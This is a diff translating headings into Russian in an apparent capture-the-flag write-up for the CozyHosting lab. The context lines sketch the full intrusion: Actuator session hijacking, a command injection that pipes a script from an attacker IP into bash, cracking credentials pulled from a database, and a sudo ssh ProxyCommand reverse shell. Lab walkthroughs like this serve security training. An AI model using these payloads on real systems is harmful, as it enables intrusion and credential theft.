@@ -10,11 +10,11 @@
 ## Цепочка Атаки
 
 ```text
-Reconnaissance
+Разведка
 ├── nmap -p- --min-rate=5000 -T4 → 22 (SSH), 80 (nginx)
 └── /etc/hosts: 10.129.229.88 cozyhosting.htb
 
-Foothold (Spring Boot Actuator)
+Первичный Доступ (Spring Boot Actuator)
 ├── gobuster → /login, /admin (401), /logout, /error
 ├── ffuf (Java-Spring-Boot.txt) → /actuator, /actuator/sessions
 ├── /actuator/sessions → {"...":"kanderson"}
@@ -26,18 +26,18 @@ Command Injection (${IFS})
 ├── Payload: test;curl${IFS}http://10.10.14.177:7000/rev.sh|bash;
 └── shell от app
 
-Credential Leak (JAR → PostgreSQL)
+Утечка Учётных Данных (JAR → PostgreSQL)
 ├── /app/cloudhosting-0.0.1.jar → BOOT-INF/classes/application.properties
 │   └── postgres:<PASSWORD>
 ├── psql → SELECT * FROM users
 │   └── admin:<BCRYPT_HASH>
 └── hashcat -m 3200 → admin:<PASSWORD>
 
-User Flag (Password Reuse)
+Флаг Пользователя (Password Reuse)
 ├── ssh josh@10.129.229.88 → <PASSWORD>
 └── cat user.txt → <USER_FLAG>
 
-Privilege Escalation (sudo ssh ProxyCommand)
+Повышение Привилегий (sudo ssh ProxyCommand)
 ├── sudo -l → (root) /usr/bin/ssh *
 ├── sudo ssh -o ProxyCommand=';bash -c "bash -i >& /dev/tcp/... 0>&1"' x
 └── root → cat /root/root.txt (<ROOT_FLAG>)
